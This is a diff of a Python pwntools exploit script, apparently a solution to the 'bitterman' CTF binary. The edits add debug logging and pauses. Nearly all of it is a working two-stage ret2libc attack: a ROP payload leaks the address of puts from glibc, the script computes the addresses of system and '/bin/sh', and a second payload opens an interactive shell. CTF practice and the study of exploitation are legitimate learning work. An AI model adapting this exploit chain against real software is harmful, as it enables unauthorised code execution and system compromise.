@@ -5,7 +5,7 @@ from pwn import *
 p = process('./bitterman')
 #p = gdb.debug('./bitterman','b main')
 context(os='linux',arch='amd64')
-context.log_level = 'DEBUG' 
+#context.log_level = 'DEBUG' 
 
 main_plt = p64(0x4006ec)
 put_plt = p64(0x400520)
@@ -37,14 +37,17 @@ p.sendline("1024") # this is send some data
 p.recvuntil("text:") # this is recive last msg
 #print(5)
 p.sendline(payload) # send payload
+#raw_input("this is raw input after first payload") # this is for segfult
+
 #print(6)
-raw_input() # this is for segfult
 p.recvuntil("Thanks!")
 
 lecked_put = p.recv()[:8].strip().ljust(8,"\x00")
 #print(str(lecked_put))
-log.success("Lecked puts@Glibc: " +str(lecked_put))
+log.success("Lecked puts@Glibc: " +str(hex(u64(lecked_put))))
 lecked_put = u64(lecked_put)
+raw_input("this is raw input after first payload") # this is for segfult
+
 ### secound stage 
 
 pop_rdi = p64(0x400853)
@@ -58,7 +61,9 @@ print(type(libc_bin_sh))
 
 offset = lecked_put - libc_puts
 sys = p64(offset + libc_system)
+log.info("system address :" + str(hex(u64(sys))))
 sh = p64(offset + libc_bin_sh)
+log.info("'/bin/sh' address :" + str(hex(u64(sh))))
 
 payload = junk + pop_rdi + sh + sys
 #p.send(payload)
@@ -67,6 +72,7 @@ p.recvline("message:")
 p.sendline("1024") # this is send some data
 p.recvuntil("text:") # this is recive last msg
 p.sendline(payload) # send payload
+raw_input('press enter, this is secound payload ')
 p.recvuntil("Thanks!")
 
 p.interactive()
